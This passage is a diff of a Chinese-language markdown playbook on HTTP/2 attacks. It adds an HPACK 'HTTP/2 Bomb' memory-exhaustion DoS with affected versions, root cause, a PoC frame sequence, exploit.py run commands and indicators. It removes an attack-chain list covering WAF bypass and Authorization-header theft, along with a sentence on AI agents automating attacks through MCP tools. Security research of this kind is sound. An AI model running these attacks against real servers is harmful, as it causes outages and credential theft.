@@ -103,23 +103,79 @@ H2C_SMUGGLE = (
 # → 泄露其他 stream 的 header key
 ```
 
-## 攻击链
+## HTTP/2 Bomb — HPACK 索引引用放大 + 流控窗口停滞（CVE-2026-49975）
 
+低带宽客户端 → 服务器端极高头部内存分配 + WINDOW_UPDATE 阻止释放 → 内存耗尽 DoS。
+
+### 受影响实现
+
+| 实现 | 受影响版本 | 修复版本 |
+|------|-----------|---------|
+| nginx | 1.29.7 默认配置 | 1.29.8（`max_headers`） |
+| Apache httpd | 2.4.67 | mod_http2 v2.0.41 |
+| Envoy | 1.37.2 | 2026-06-03 补丁 |
+| Microsoft IIS | Windows Server 2025 | 公开时未修复 |
+| Cloudflare Pingora | 0.8.0 | 公开时未修复 |
+
+### 根因
+
+**第一层：HPACK 动态表索引用极低成本换取服务器内存分配**
+
+```text
+客户端：1 字节索引引用 → 服务器：分配完整头部副本（数百至数千字节）
 ```
-H2C upgrade → 前端 HTTP/1.1 → 后端 H2C → 绕过前端 WAF → 直接打后端
-CONTINUATION flood → 服务端 OOM → DoS → 绕过 rate limit
-HPACK bomb → memory exhaustion → 其他请求失败 → 拒绝服务
-HPACK desync → 跨 stream header leak → 窃取其他用户的 Authorization header
-Stream multiplexing → RST_STREAM 竞争 → request smuggling → 缓存投毒
+
+动态表允许一个字节的索引代表一整段头部值。攻击者反复引用同一索引 → 服务器为每次引用分配完整头部副本。
+
+**第二层：WINDOW_UPDATE 停滞阻止内存释放**
+
+```text
+客户端间歇性发送极小 WINDOW_UPDATE
+→ 既不让连接超时，又持续"钉住"已分配内存
 ```
+
+**第三层：规范约束与实现缓解之间的缝隙**
+
+RFC 7541 提到 HPACK 内存风险，但很多实现只关注动态表大小上限和帧大小限制，没有同时做好最大头部字段数限制、最大解码头部总大小限制、长期停滞流的生存期限制。
+
+### PoC 核心流程
+
+```python
+# 1. 建立 HTTP/2 连接
+send_exact(sock, CLIENT_PREFACE)
+send_exact(sock, build_settings())
+
+# 2. 启动连接级零窗口信号
+send_exact(sock, build_window_update(0, 0))
+
+# 3. 发送带大量索引引用的 HEADERS 帧
+headers_frame = build_headers_frame(stream_id, indexed_references=4096)
+send_exact(sock, headers_frame)
+
+# 4. 持有连接并维持停滞状态
+recv_forever(sock, end_time)
+```
+
+### 复现
+
+```bash
+cd "CVE-2026-49975 HTTP2 Bomb"
+python3 exploit/exploit.py --host 127.0.0.1 --port 443 --hold-seconds 30
+python3 exploit/exploit.py --host 127.0.0.1 --port 80 --no-tls \
+  --streams 2 --references 4096 --hold-seconds 45
+```
+
+### 观察指标
+
+- HTTP/2 服务进程 RSS 快速上升
+- 响应延迟或完全不返回
+- 单连接内存压力极高（区别于大量连接型 DoS）
 
 ## Evidence
 
 记录: HTTP/2 frame 序列 (hex)、服务端响应 SETTINGS/GOAWAY/RST_STREAM、内存/CPU 监控
 
 ## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 
 | 攻击步骤 | MCP 工具 | 说明 |
 |---------|---------|------|
